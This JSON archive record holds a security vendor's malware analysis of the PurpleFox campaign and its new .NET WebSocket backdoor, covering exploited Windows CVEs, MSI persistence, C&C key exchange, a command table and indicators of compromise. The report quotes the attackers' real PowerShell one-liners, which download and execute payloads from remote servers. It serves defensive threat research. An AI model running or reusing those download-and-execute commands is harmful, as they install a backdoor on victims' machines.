{
    "id": "41212e9f-18b3-4670-bf14-4d11d06cc4f3",
    "created_at": "2023-01-12T15:10:51.91468Z",
    "updated_at": "2025-03-27T02:05:44.263018Z",
    "deleted_at": null,
    "sha1_hash": "c6912e166e515b5e8557622dc29869c45bd71a1b",
    "title": "2021-10-19 - PurpleFox Adds New Backdoor That Uses WebSockets",
    "authors": "",
    "file_creation_date": "2022-05-28T19:28:27Z",
    "file_modification_date": "2022-05-28T19:28:27Z",
    "file_size": 1308339,
    "plain_text": "# PurpleFox Adds New Backdoor That Uses WebSockets\n\n**[trendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.html](https://www.trendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.html)**\n\nOctober 19, 2021\n\n[In September 2021, the Trend Micro Managed XDR (MDR) team looked into suspicious activity](https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html)\nrelated to a PurpleFox operator. Our findings led us to investigate an updated PurpleFox arsenal,\nwhich included an added vulnerability (CVE-2021-1732) and optimized rootkit capabilities\nleveraged in their attacks.\n\nWe also found a new backdoor written in .NET implanted during the intrusion, which we believe is\nhighly associated with PurpleFox. This backdoor, which we call FoxSocket, leverages\nWebSockets to communicate with its command-and-control (C&C) servers, resulting in a more\nrobust and secure means of communication compared to regular HTTP traffic.\n\nWe believe that this particular threat is currently being aimed at users in the Middle East. We first\nencountered this threat via customers in the region. We are currently investigating if it has been\nfound in other parts of the world.\n\nIn this blog, we describe some of the observed modifications for the initial PurpleFox payloads,\nalongside the new implanted .NET backdoor and the C2 infrastructure serving its functionality.\n\n**PurpleFox Capabilities and Technical Analysis**\n\n**_PowerShell_**\n\nThe activity starts with either of the following PowerShell commands being executed:\n\n\"cmd.exe\" /c powershell -nop -exec bypass -c \"IEX (New-Object\nNet.WebClient).DownloadString('hxxp[[:]]//103.228.112.246[[:]]17881/57BC9B7E.Png');MsiMake\nhxxp[[:]]//103.228.112.246[[:]]17881/0CFA042F.Png\"\n\"cmd.exe\" /c powershell -nop -exec bypass -c \"IEX (New-Object\nNet.WebClient).DownloadString('http[:]//117.187.136.141[:]13405/57BC9B7E.Png');MsiMake\nhttp[:]//117.187.136.141[:]13405/0CFA042F.Png\"\n\nThese commands download a malicious payload from the specified URLs, which are hosted on\nmultiple compromised servers. These servers are part of the PurpleFox botnet, with most of these\nlocated in China:\n\nTable 1. Location of PurpleFox servers\n\n**Country** **Server count**\n\nChina 345\n\nIndia 34\n\n\n-----\n\nBrazil 29\n\nUnited States 26\n\nOthers 113\n\nThe fetched payload is a long script consisting of three components:\n\n[1. Tater (Hot Potato – privilege escalation)](https://github.com/Kevin-Robertson/Tater/blob/master/Tater.ps1)\n[2. PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)\n[3. Embedded exploit bundle binary (privilege escalation)](https://www.virustotal.com/gui/file/5d7c25df48dac73698ae455a3d98ea38c2502edf862a47dc6db9a177147db453)\n\nThe script targets 64-bit architecture systems. It starts by checking the Windows version and\napplied hotfixes for the vulnerabilities it is targeting.\n\nWindows 7/Windows Server 2008\n\nCVE-2020-1054 (KB4556836, KB4556843)\nCVE-2019-0808 (KB4489878, KB4489885, KB2882822)\nWindows 8/Windows Server 2012\n\nCVE-2019-1458 (KB4530702, KB4530730)\nWindows 10/Windows Server 2019\n\nCVE-2021-1732 (KB4601354, KB4601345, KB4601315, KB4601319)\n\nAfter selecting the appropriate vulnerability, it uses the PowerSploit module to reflectively load the\nembedded exploit bundle binary with the target vulnerability and an MSI command as arguments.\nAs a failover, it uses the Tater module to launch the MSI command.\n\nThe goal is to install the MSI package as an admin without any user interaction.\n\n**_MSI Package_**\n\nThe MSI package starts by removing the following registry keys, which are old Purple Fox\ninstallations if any are present:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\{ac00-ac10}\n\nIt then installs the components (dbcode21mk.log and setupact64.log) of the Purple Fox backdoor\nto Windows directory. Afterward, it sets two registry values under the key\n“HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager”:\n\nAllowProtectedRenames to 0x1, and\nPendingFileRenameOperations to the following:\n\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\n\n-----\n\n\\??\\C:\\Windows\\system32\\sens.dll\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\\??\\C:\\Windows\\system32\\sens.dll\n\n\\??\\C:\\Windows\\setupact64.log\n\\??\\C:\\Windows\\system32\\sens.dll\n\nThese commands move sens.dll to C:\\Windows\\AppPatch\\Acpsens.dll and replace it with the\ninstalled file setupact64.log.\n\nThe MSI package then runs a .vbs script that creates a Windows firewall rule to block incoming\nconnections on ports 135, 139, and 445. As a final step, the system is restarted to allow\nPendingFileRenameOperations to take place, replacing sens.dll, which will make the malware run\nas the System Event Notification Service (SENS).\n\n**_PurpleFox Backdoor_**\n\nThe installed malware is a .dll file protected with VMProtect. Using the other data file installed by\nthe MSI package, it unpacks and manually loads different DLLs for its functionality. It also has a\nrootkit driver that is also unpacked from the data file and is used to hide its files, registry keys, and\nprocesses. The sample starts by copying itself to another file and installing a new service, then\nrestoring the original sens.dll file. Afterward, it loads the driver to hide its files and registries and\nthen spawns and injects a sequence of a 32-bit process to inject its code modules into, as they\nare 32-bit DLLs.\n\n\n-----\n\nFigure 1.\n\nPurpleFox installation process\nWebSocket Backdoor\n\n**_Initial Delivery_**\n\nThe initial activity for retrieving this backdoor was captured three days after the previous\nPurpleFox intrusion attempts on the same compromised server. The Trend Micro Vision One™\nplatform flagged the following suspicious PowerShell commands:\n\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/1'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/2'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/3'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/4'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/5'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/8'))\"\n\n\n-----\n\ncmd.exe /c powershell -c iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/9'))\"\n\nFigure 2. Trend Micro Vision One alert for PowerShell commands\nWe analyzed the payload hosted on the URLs, which were variations of 185[.]112.144.245/a/[1-9],\nand all were found to be serving two variants of another PowerShell script that acts as the main\ndownloader for the .NET backdoor.\n\nFigure 3.\n\nContents of payload\nThe difference between the two observed PowerShell scripts were in Base64-encoded data that\nwas passed as an argument to the .NET sample downloaded from 185[.]112[.]144[.]45/a/data and\nfinally invoked with this configuration parameter. We found two different configuration parameters\nused: We observed the first one on August 26 and the second one with more domains embedded\non August 30. The decoded Base64-encoded configuration parameters are shown in the following\nfigures:\n\n\n-----\n\nAugust 26 configuration\n\n\nFigure 4.\n\nFigure 5.\n\n\nAugust 30 configuration\nThese configuration parameters will be used by the .NET initialization routines to pick a C&C\nserver and initialize cryptographic functions for the C&C channel. Aside from the configuration, the\npayload itself is retrieved from 185.112.144[.]45/a/data.We also found some old variants that date\nback to June 22 that have fewer capabilities than the more recent variants.\n\nDuring the earliest iterations for deploying this backdoor, aligning with the creation data of the\nmalicious domain advb9fyxlf2v[.]com, the configuration parameters had a minimal number of\nsubdomains to contact the C&C servers compared to the recent one.\n\n\n-----\n\nFigure 6.\n\nBackdoor configuration\n.NET Backdoor Obfuscation\n\nLet us start the analysis with the backdoor dropped on the SQL server. When decompiled, it will\noutput some obfuscated symbols, although most of these can’t be restored to the original. Merely\nmaking them to be human-readable is sufficient for basic static analysis. Sometimes, some of the\noriginal names can be restored.\n\nFigure 7. Cleaned classes and method names\n\nOne notable characteristic we rarely see in malware is leveraging WebSocket communication to\nthe C&C servers for an efficient bidirectional channel between the infected client and the server.\n\nWebSocket is a communication technology that supports streams of data to be exchanged\nbetween a client and a server over just a single TCP session. This is different from traditional\nrequest or response protocols like HTTP. This gives the threat actor a more covert alternative to\nHTTP requests and responses traffic, which creates an opportunity for a more silent exfiltration\nwith less likelihood of being detected.\n\n\n-----\n\nFigure 8.\n\nTraditional (left) and WebSocket techniques (right)\nIt initializes a WebSocket communication with its C&C server and keeps it open by sending\nkeepalive messages to maintain the TCP connection. Once this is established, a series of\nbidirectional messages will be exchanged between the infected machine and the selected C&C\nserver to negotiate a session encryption key.\n\nFigure 9.\n\nTCP/IP exchanges between client and server\nThe execution starts by initializing the WebSocket and registering four callback functions as\nhandlers for the WebSocket events.\n\n\n-----\n\nFigure 10. Function for\n\nregistering callback functions\nOne of the relevant callbacks is onOpen, which will initialize the C&C channel encryption\nparameters once the WebSocket object is fired for the first time. As shown in the next section, this\nis mainly for implementing the first Diffie-Hellman (DH) key exchange message with the C&C\nserver. On the other side, the onReceive handler will process and dispatch all the commands\nreceived from the server after a secure communication channel is established and when the\nsession encryption key is updated.\n\nKey Negotiations\n\nThe first key exchange with the C&C server is carried out by the onOpen callback registered\nfunction, as seen in Figure 11.\n\nFigure 11.\n\nonOpen function\nIt initializes the EC DH object with some parameters to start the shared secret key negotiation.\nThe ECDiffieHellmanKeyDerivationFunction property is then set to Hash. This property is for\nspecifying the key derivation function that the ECDiffieHellmanCng class will use to convert\nsecret agreements into key material, so a hash algorithm is used to generate key material\n(instead of HMAC or TLS).\n\nAfterward, the client will try to send the property PublicKey, which will be used at the C&C side on\nanother ECDiffieHellmanCng object to generate a shared secret agreement. Eventually, this data\nwill be sent on the WebSocket as the first key exchange message. However, instead of sending it\nin cleartext, the client deploys a symmetric AES encryption for any communication over the\nWebSocket for the first exchange, as no shared secret is established yet, and the AES encryption\nwill generate a default key for this first exchange.\n\n\n-----\n\nFigures 12-13.\n\nFunction and code for the AES encryption key\nThis will result in the key negotiation message being encrypted with AES using the shown\nparameters and a dummy key generated (111….11)[32] named byte_0 in the following debugging\nsession with the actual AES cipher text with a fixed length of 176 bytes.\n\nFigure 14.\n\nStructure of key exchange message\nThe 176 encrypted bytes are the actual data that will be sent over the WebSocket, which marks\nthe end of the first key exchange message.\n\nSecond Exchange (C&C to Victim)\n\nThe second key exchange message is sent from the server to the client that will be handled by the\n**onReceive function. The execution is invoked by the message handler.**\n\nFigure 15. Invoking the onReceive\n\nfunction\nThis AES-encrypted second exchange has a fixed length of 304 bytes.\n\n\n-----\n\nFigure 16.\n\nContents of incoming message\nIt then checks if this incoming message is related to the control plane key establishment or just a\nnormal data command.\n\nIf it is related to the former, the first step is to decrypt the symmetric encryption on the C2 channel\nthen finalize the shared secret generation by handing the execution to ECDH derivation function\nmethod_7.\n\nFigure 17. Handoff to\n\nmethod_7 function\nThe client will verify the signed message by loading the RSA public key loaded from the\nconfiguration payload shown in the previous section. If the signature is verified correctly, key\nmaterial will be derived from the DH exchange and will be saved as the permanent symmetric\nAES encryption key (Symmetric_AES_key variable) that will be used as long as the WebSocket\nchannel is active.\n\n\n-----\n\nFigure 18.\n\nmethod_7 function\nThird Exchange (Victim to C&C)\n\nOnce an efficient encrypted session is established over the WebSocket, the client will fingerprint\nthe machine by extracting specific data (including the username, machine name, local IP, MAC\naddress, and Windows version) and will relay such data over the secure channel to get the victim\nprofiled at the server side, which is the final exchange before the WebSocket channel is fully\nestablished. It will then listen for further commands, which will be covered in the next section.\n\nAs the fingerprinting data collected will be different from one execution environment to another,\nthis message will vary in length. From our lab analysis, it was 240 bytes with the newly generated\nshared secret key.\n\nFigure 19.\n\nNewly generated secret key\nAs far as the WebSocket is maintained with the keepalive messages shown earlier, the operators\ncan signal any command to be executed, so what happens next mainly depends on the targeting\nand the actual motivation of the operator.\n\nWebSocket Commands\n\nIn this section, we cover some of the observed commands sent from the server. There are some\nminor differences between variants across them with regard to the command numbers and the\nsupported functionality\n\n\n-----\n\nAll the handling of commands is implemented in the main dispatch routine (except for command\n160, which is used for key negotiation or renegotiation).\n\nTable 2. List of commands\n\n**Command code** **Functionality**\n\n20 Sends the current date on the victim machine\n\n30 Leaks DriveInfo.GetDrives() results info for all the drives\n\n40 Leaks DirectoryInfo() results info for a specific directory\n\n50 FileInfo()results info for a specific file\n\n60 Recursive directory search\n\n70 Executes WMI queries - ManagementObjectSearcher()\n\n80 Closes the WebSocket Session\n\n90 Exits the process\n\n100 Spawns a new process\n\n110 Downloads more data from a specific URL to the victim machine\n\n120 DNS lookup from the victim machine\n\n130 Leaks specific file contents from the victim machine\n\n140 Writes new content to a specific location\n\n150 Downloads data then write to a specific file\n\n160 Renegotiates session key for symmetric encryption\n\n180 Gets current process ID/Name\n\n210 Returns the configuration parameter for the backdoor\n\n220 Kills the process then start the new process with a different config\n\n230 Kills specific process with PID\n\n240 Queries internal backdoor object properties\n\n260 Leaks hashes of some specific files requested\n\n270 Kills list of PIDs\n\n280 Deletes list of files/directories requested\n\n290 Moves list of files/directories to another location\n\n\n-----\n\n300 Creates new directory to a specific location\n\nWebSocket C&C Infrastructure\n\nAt the time of this writing, there were several active C&C servers controlling the WebSocket\nclients. By profiling the infected targets and interacting through different commands sent, we listed\nthe observed IP addresses and the registered domains found in the PowerShell downloaders and\nthe backdoor configuration parameters.\n\nTable 3. WebSocket C&C serversIP address Description ASN Notable activity\n\n**IP address** **Description** **ASN** **Notable activity**\n\n\n185.112.144.245 (Hosting PS payloads,\n/a/[1-9])\n\n(Hosting .Net Payload,\n/a/data)\n\n\nAS 44925 ( 1984\nehf )\n\n\nIraq, Saudi Arabia, Turkey,\nUAE\n\n\n185.112.147.50 C&C server Turkey, US, UAE\n\n185.112.144.101 Turkey\n\n93.95.226.157 US\n\n93.95.228.163 US\n\n93.95.227.183 \n93.95.227.169 UAE\n\n93.95.227.179 \n185.112.146.72 Potential C&C server \n185.112.146.83 \nThe backdoor picks one subdomain randomly from the configuration data and tries to connect via\nWebSockets. If it fails to connect on port 12345, it will try to resolve another subdomain.\n\nFigure 20.\n\nRandom C&C servers\nThe main domain advb9fyxlf2v[.]com used by these servers — registered on June 17, 2021, just\nwithin days of the first observed variant — is mainly for load balancing across the multiple active\nservers\n\n\n-----\n\nConclusion\n\nThe rootkit capabilities of PurpleFox make it more capable of carrying out its objectives in a\nstealthier manner. They allow PurpleFox to persist on affected systems as well as deliver further\npayloads to affected systems. We are still monitoring these new variants and their dropped\npayloads. The new .NET WebSocket backdoor (called FoxSocket, which we detect as\nBackdoor.MSIL.PURPLEFOX.AA) is being closely monitored to discover any more information\nabout this threat actor’s intentions and objectives.\n\nTrend Micro Solutions and Indicators of Compromise\n\n[The capabilities of the Trend Micro Vision One platform made both the detection of this attack and](https://www.trendmicro.com/en_us/business/products/detection-response.html)\nour investigation into it possible. We took into account metrics from the network and endpoints\nthat would indicate potential attempts of exploitation. The Trend Micro Vision One Workbench\nshows a holistic view of the activities that are observed in a user’s environment by highlighting\nimportant attributes related to the attack.\n\n[Trend Micro Managed XDR offers expert threat monitoring, correlation, and analysis from](https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html)\nexperienced cybersecurity industry veterans, providing 24/7 service that allows organizations to\nhave one single source of detection, analysis, and response. This service is enhanced by\nsolutions that combine AI and Trend Micro’s wealth of global threat intelligence.\n\n[All IOCs related to this attack can be found in this separate file.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/j/purplefox-backdoor-uses-websockets/iocs-purplefox.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-19 - PurpleFox Adds New Backdoor That Uses WebSockets.pdf"
    ],
    "report_names": [
        "2021-10-19 - PurpleFox Adds New Backdoor That Uses WebSockets.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536251,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653766107,
    "ts_modification_date": 1653766107,
    "files": {
        "pdf": "https://archive.orkl.eu/c6912e166e515b5e8557622dc29869c45bd71a1b.pdf",
        "text": "https://archive.orkl.eu/c6912e166e515b5e8557622dc29869c45bd71a1b.txt",
        "img": "https://archive.orkl.eu/c6912e166e515b5e8557622dc29869c45bd71a1b.jpg"
    }
}